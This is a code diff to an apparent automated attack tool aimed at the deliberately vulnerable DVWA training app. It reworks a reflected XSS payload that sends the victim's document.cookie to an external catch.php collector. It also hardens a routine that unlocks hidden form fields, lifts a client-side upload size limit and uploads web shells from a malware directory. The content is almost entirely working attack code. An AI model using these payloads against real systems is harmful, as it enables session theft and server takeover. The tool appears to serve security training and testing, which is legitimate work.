@@ -334,14 +334,18 @@ class DVWAAttacks:
             stamp = funcs.createRandAlpha(length=30)
             response = ""
             encoded = ""
-            query_args = {'name':'<script>new Image().src="' + vars.getExtUrl() + 'catch.php?'}
+            query_args = {'name':'<script>new+Image().src="' + vars.getExtUrl() + 'catch.php?'}
             encoded += urllib.urlencode(query_args)
-            query_args = {'cookie':'+encodeURI(document.cookie);</script>'}
+            query_args = {'cookie':'+encodeURI(document.cookie);+"&'}
             encoded += urllib.urlencode(query_args)
             query_args = {'stamp':stamp}
             encoded += urllib.urlencode(query_args)
-            urllib2.urlopen(self.url + self.apppath + "vulnerabilities/xss_r/?" + encoded)
-            time.sleep(8)
+            encoded += '%3C%2Fscript%3E"'
+            try:
+                urllib2.urlopen(self.url + self.apppath + "vulnerabilities/xss_r/?" + encoded)
+                time.sleep(8)
+            except:
+                pass
             
             if vars.getUseBrowser():
                 webbrowser.open(vars.getExtUrl() + "catch.php", new=2, autoraise=True)
@@ -1064,25 +1068,28 @@ class DVWAAttacks:
         regUploadSuccess = re.compile(uploadsuccesstr,re.I+re.MULTILINE)
         results = []
         mpath = vars.getMalwarePath()
+        resp = ""
 
         attackform = funcs.doFormDiscovery(fp, targetpage)
         if attackform:
             for f in attackfilename:
-
-                fp.open(targetpage)
-                fp.select_form(nr=0)
-                for k,v in attackform[0]['HiddenControl'].items():
-                    # modify hidden fields
-                    fp.find_control(k).readonly = False
-                    # alter the accepted body size since it
-                    # is enforced client-side
-                    fp[k] = '1000000000'
-
-                filehandle = open(mpath + f)
-                fp.form.add_file(filehandle, None, f)
-                fp.submit()
-                vars.typecount['upload'][0] += 1
-                resp = fp.response().read()
+                try:
+                    fp.open(targetpage)
+                    fp.select_form(nr=0)
+                    for k,v in attackform[0]['HiddenControl'].items():
+                        # modify hidden fields
+                        fp.find_control(k).readonly = False
+                        # alter the accepted body size since it
+                        # is enforced client-side
+                        fp[k] = '1000000000'
+    
+                    filehandle = open(mpath + f)
+                    fp.form.add_file(filehandle, None, f)
+                    fp.submit()
+                    vars.typecount['upload'][0] += 1
+                    resp = fp.response().read()
+                except:
+                    pass
 
                 if regUploadSuccess.search(resp):
                     results.append("%s shell uploaded" % f[0:3])
